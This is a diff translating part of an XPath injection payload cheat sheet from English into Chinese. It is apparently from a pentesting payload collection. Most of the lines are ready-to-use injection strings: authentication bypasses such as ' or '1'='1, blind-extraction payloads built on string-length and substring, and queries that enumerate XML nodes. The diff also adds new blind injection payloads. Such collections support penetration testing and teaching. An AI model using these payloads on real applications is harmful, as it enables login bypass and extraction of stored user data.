@@ -1,8 +1,8 @@
-# XPATH injection
-XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.
+＃ XPATH注入
+XPath注入是一种攻击技术，用于利用从用户提供的输入中构建XPath（XML路径语言）查询来查询或导航XML文档的应用程序。
 
-## Exploitation
-Similar to SQL : "string(//user[name/text()='" +vuln_var1+ "' and password/text()=’" +vuln_var1+ "']/account/text())"
+## 利用
+类似于SQL : "string(//user[name/text()='" +vuln_var1+ "' and password/text()=’" +vuln_var1+ "']/account/text())"
 ```
 ' or '1'='1
 ' or ''='
@@ -19,12 +19,12 @@ x' or name()='username' or 'x'='y
 ' and count(/comment())=1 and '1'='1
 ```
 
-## Blind Exploitation
+## 盲注利用
 ```
-1. Size of a string
+1. 字符串长度
 and string-length(account)=SIZE_INT
 
-2. Extract a character
+2. 提取一个字符串
 substring(//user[userid=5]/username,2,1)=CHAR_HERE
 substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
 ```
@@ -47,8 +47,14 @@ count(path/attribute::*)
 第N个属性名称是
 (path/attribute::*[position()=N])
 
-count(path/child::node()) - the count of all the nodes for the given path.
-count(path/child::text()) - number of text fields children (up to 1...).
-count(path/child::comment()) - number of comment nodes.
-count(path/child::*) - the number of element children.
-count(path/child::processing-instruction()) - the number of PI nodes.
+首先，我们需要知道各个子节点的数量：
+count（path/child::node()）-给定路径的所有节点的计数。
+count（path/child::text()）-文本字段子项的数量（最多1个）。
+count（path/child::comment()）-注释节点的数量。
+count（path/child::*）-元素子元素的数量。
+count（path/child::processing-instruction()）-PI节点的数量。
+
+计算字符串长度
+' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''='
+盲注
+' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''='
